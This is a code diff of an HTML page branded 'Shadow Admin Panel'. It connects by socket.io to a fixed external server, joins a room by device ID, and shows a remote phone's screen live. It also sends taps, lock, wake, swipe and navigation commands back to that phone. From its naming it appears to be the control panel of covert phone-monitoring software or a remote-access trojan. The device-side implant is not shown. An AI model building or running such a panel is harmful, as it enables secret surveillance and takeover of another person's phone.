@@ -3,145 +3,197 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Shadow Admin - Live View</title>
+    <title>Shadow Admin Panel</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 
     <style>
-        :root { --bg-color: #000000; --accent: #00ff88; --panel: #111; }
+        :root {
+            --bg-color: #050505;
+            --panel-bg: #1a1a1a;
+            --accent: #00ff88;
+            --danger: #ff3333;
+            --text-main: #ffffff;
+        }
 
         body {
-            margin: 0; background-color: var(--bg-color); color: white;
-            font-family: sans-serif; height: 100vh; overflow: hidden;
-            display: flex; flex-direction: column; align-items: center;
+            margin: 0; background-color: var(--bg-color); color: var(--text-main);
+            font-family: 'Segoe UI', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* Status Bar */
-        .top-bar {
-            width: 100%; padding: 10px 20px; background: var(--panel);
-            display: flex; justify-content: space-between; border-bottom: 1px solid #333;
-            z-index: 100;
+        /* --- Header (Old Style) --- */
+        .top-nav {
+            padding: 15px 20px; background: var(--panel-bg); border-bottom: 1px solid #333;
+            display: flex; justify-content: space-between; align-items: center; z-index: 200;
+        }
+        .brand { font-size: 1.2rem; font-weight: bold; color: var(--accent); letter-spacing: 1px; }
+        .status-badge { font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
+        .live-dot { height: 10px; width: 10px; background-color: var(--danger); border-radius: 50%; box-shadow: 0 0 5px var(--danger); }
+        .live-dot.active { background-color: var(--accent); box-shadow: 0 0 8px var(--accent); }
+
+        /* --- Main Layout --- */
+        .screen-container {
+            flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; position: relative;
         }
 
-        /* Main Screen Area */
-        .screen-box {
-            position: relative;
-            width: 100%; max-width: 360px; /* Phone width limit */
-            height: 100%; flex: 1;
-            display: flex; align-items: center; justify-content: center;
-            background: #111; border-left: 1px solid #333; border-right: 1px solid #333;
-        }
-
-        /* 🔥 IMAGE FIX: Object-fit contain rakha hai taaki puri screen dikhe */
-        #screenStream {
-            width: 100%; height: 100%;
-            object-fit: contain; 
+        /* --- Phone Frame (PC View) --- */
+        .phone-frame {
+            width: 320px; height: 650px; border: 8px solid #222; border-radius: 30px;
+            background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
+            overflow: hidden; display: flex; align-items: center; justify-content: center;
             z-index: 10;
         }
 
-        /* Message if screen is black */
-        .loading-text {
-            position: absolute; color: #555; z-index: 1;
+        /* Image Styling */
+        #screenStream { 
+            width: 100%; height: 100%; object-fit: contain; 
+            z-index: 1; /* Image peeche rahegi */
+        }
+        
+        /* Loading/Offline Message */
+        .offline-msg { 
+            position: absolute; color: #444; text-align: center; 
+            display: flex; flex-direction: column; align-items: center; z-index: 0; 
         }
 
-        /* Buttons Overlay (Invisible Touch Area for controls) */
-        .nav-overlay {
-            position: absolute; bottom: 0; width: 100%; height: 60px;
-            background: rgba(0,0,0,0.8); display: flex; justify-content: space-around; align-items: center;
-            z-index: 20; border-top: 1px solid #333;
+        /* --- Side Panel (Controls) --- */
+        .side-panel {
+            position: absolute; right: 30px; display: flex; flex-direction: column; gap: 15px;
+            background: rgba(26, 26, 26, 0.8); padding: 15px; border-radius: 20px; border: 1px solid #333;
+            z-index: 100;
         }
-        .nav-btn { padding: 15px; font-size: 1.5rem; color: #888; cursor: pointer; }
-        .nav-btn:active { color: var(--accent); }
+        .control-btn {
+            width: 50px; height: 50px; border-radius: 50%; background: #2a2a2a; border: 1px solid #444;
+            color: white; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; font-size: 1.2rem;
+        }
+        .control-btn:active { transform: scale(0.9); background: var(--accent); color: black; }
 
-        /* Side Controls (Floating) */
-        .fab-controls {
-            position: absolute; right: 20px; bottom: 100px;
-            display: flex; flex-direction: column; gap: 15px; z-index: 50;
+        /* --- 3 Buttons (Bottom Nav) --- */
+        .nav-bar {
+            width: 100%; height: 60px; background: rgba(0, 0, 0, 0.9);
+            position: absolute; bottom: 0; display: flex; justify-content: space-around; align-items: center; border-top: 1px solid #333;
+            z-index: 100; /* Buttons sabse upar */
         }
-        .fab {
-            width: 50px; height: 50px; background: #222; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            border: 1px solid #444; box-shadow: 0 4px 10px black; cursor: pointer;
-        }
-        .fab:active { background: var(--accent); color: black; }
+        .nav-item { color: #888; font-size: 1.4rem; cursor: pointer; padding: 15px; width: 100%; text-align: center; }
+        .nav-item:active { color: var(--accent); background: rgba(255,255,255,0.1); }
 
+        /* 🔥 MOBILE FULL SCREEN FIX */
+        @media (max-width: 768px) {
+            .top-nav { display: none; } /* Mobile me Header hata diya taaki full view mile */
+            .screen-container { padding: 0; height: 100vh; width: 100vw; background: black; }
+            
+            .phone-frame { 
+                width: 100%; height: 100%; 
+                border: none; border-radius: 0; /* Border hata diya */
+                box-shadow: none; max-width: none;
+            }
+
+            /* Controls ko thoda transparent aur side me kar diya */
+            .side-panel { 
+                right: 10px; bottom: 80px; 
+                background: transparent; border: none; padding: 0;
+            }
+            .control-btn { 
+                background: rgba(0,0,0,0.5); border: 1px solid #444; 
+                width: 45px; height: 45px;
+            }
+        }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <span style="color:var(--accent); font-weight:bold;">SHADOW VIEW</span>
-        <span id="fps-counter" style="font-size:12px; color:#555;">FPS: 0</span>
-    </div>
-
-    <div class="screen-box">
-        <div class="loading-text">Waiting for Image Data...</div>
-        
-        <img id="screenStream" src="" alt="" onclick="sendClick(event)">
-        
-        <div class="nav-overlay">
-            <div class="nav-btn" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
-            <div class="nav-btn" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
-            <div class="nav-btn" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
+    <div class="top-nav">
+        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW</div>
+        <div class="status-badge">
+            <span class="live-dot" id="dot"></span> 
+            <span id="statusText" style="color:#888">Waiting...</span>
         </div>
     </div>
 
-    <div class="fab-controls">
-        <div class="fab" onclick="sendCommand('unlock')"><i class="fa-solid fa-power-off"></i></div>
-        <div class="fab" onclick="sendCommand('swipe_up')"><i class="fa-solid fa-arrow-up"></i></div>
+    <div class="screen-container">
+        <div class="phone-frame">
+            
+            <div id="offlineMsg" class="offline-msg">
+                <i class="fa-solid fa-spinner fa-spin fa-2x"></i>
+                <p style="margin-top:10px" id="msgText">Connecting to Device...</p>
+            </div>
+            
+            <img id="screenStream" src="" alt="" onclick="sendClick(event)">
+            
+            <div class="nav-bar">
+                <div class="nav-item" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
+                <div class="nav-item" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
+                <div class="nav-item" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
+            </div>
+        </div>
+
+        <div class="side-panel">
+            <div class="control-btn" onclick="sendCommand('lock')" title="Lock"><i class="fa-solid fa-power-off"></i></div>
+            <div class="control-btn" onclick="sendCommand('unlock')" title="Wake"><i class="fa-solid fa-sun"></i></div>
+            <div class="control-btn" onclick="sendCommand('swipe_up')" title="Scroll Down"><i class="fa-solid fa-arrow-up"></i></div>
+            <div class="control-btn" onclick="sendCommand('swipe_down')" title="Scroll Up"><i class="fa-solid fa-arrow-down"></i></div>
+        </div>
     </div>
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com"; 
         let socket = null;
         let currentDeviceId = null;
-        let lastFrameTime = Date.now();
-        let frameCount = 0;
 
-        window.onload = () => {
+        window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             currentDeviceId = urlParams.get('id');
-            if(currentDeviceId) startConnection();
+
+            if (currentDeviceId) {
+                document.getElementById('statusText').innerText = "ID: " + currentDeviceId;
+                startConnection(); 
+            } else {
+                document.getElementById('msgText').innerText = "Link Error: No ID";
+                document.getElementById('statusText').innerText = "No ID";
+            }
         };
 
         function startConnection() {
             socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
 
             socket.on("connect", () => {
-                console.log("Connected");
-                socket.emit("join", currentDeviceId);
+                console.log("Connected!");
+                document.getElementById('statusText').innerText = "Online";
+                document.getElementById('statusText').style.color = "var(--accent)";
+                document.getElementById('dot').classList.add("active");
+                socket.emit("join", currentDeviceId); 
             });
 
-            // 🔥 MAGIC FIX: Auto-Detect Image Format
+            socket.on("disconnect", () => {
+                document.getElementById('statusText').innerText = "Offline";
+                document.getElementById('statusText').style.color = "var(--danger)";
+                document.getElementById('dot').classList.remove("active");
+                document.getElementById('offlineMsg').style.display = "flex";
+            });
+
+            // 🔥 FINAL IMAGE FIX: Auto-Detect Format
             socket.on("screen-data", (data) => {
+                // Loading hatao
+                document.getElementById('offlineMsg').style.display = "none";
                 const img = document.getElementById('screenStream');
                 
-                // FPS Counter (Ye batayega image aa rahi hai ya nahi)
-                frameCount++;
-                if(frameCount % 10 === 0) {
-                    let fps = Math.round(1000 / (Date.now() - lastFrameTime) * 10);
-                    document.getElementById('fps-counter').innerText = "Live Packets: " + frameCount;
-                    lastFrameTime = Date.now();
-                }
-
                 if (!data.image) return;
 
-                // 1. Agar data me pehle se Header hai to waise hi chalao
-                if(data.image.startsWith("data:image")) {
+                // Smart Detection Logic
+                let prefix = "data:image/webp;base64,"; // Default WebP (Fastest)
+
+                if (data.image.startsWith("/9j/")) {
+                    prefix = "data:image/jpeg;base64,"; // Agar JPEG hai
+                } else if (data.image.startsWith("iVBOR")) {
+                    prefix = "data:image/png;base64,"; // Agar PNG hai
+                }
+
+                // Check agar prefix pehle se laga hai
+                if (data.image.startsWith("data:image")) {
                     img.src = data.image;
-                } 
-                // 2. Agar '/9j/' se shuru hai to JPEG hai
-                else if (data.image.startsWith("/9j/")) {
-                    img.src = "data:image/jpeg;base64," + data.image;
-                }
-                // 3. Agar 'UklGR' se shuru hai to WEBP hai
-                else if (data.image.startsWith("UklGR")) {
-                    img.src = "data:image/webp;base64," + data.image;
-                }
-                // 4. Fallback (Default to WebP)
-                else {
-                    img.src = "data:image/webp;base64," + data.image;
+                } else {
+                    img.src = prefix + data.image;
                 }
             });
         }
@@ -157,18 +209,14 @@
             const img = document.getElementById('screenStream');
             const rect = img.getBoundingClientRect();
             
-            // Scaling Logic (Zaruri hai agar phone size alag ho)
-            const scaleX = img.naturalWidth / rect.width;
-            const scaleY = img.naturalHeight / rect.height;
-
-            const x = (event.clientX - rect.left); // Simple click bhej raha hu
-            const y = (event.clientY - rect.top);
+            // Exact calculation for accurate touch
+            const x = Math.round(event.clientX - rect.left);
+            const y = Math.round(event.clientY - rect.top);
 
             socket.emit("control-event", {
                 room: currentDeviceId,
                 action: "click",
-                x: Math.round(x),
-                y: Math.round(y)
+                x: x, y: y
             });
         }
     </script>
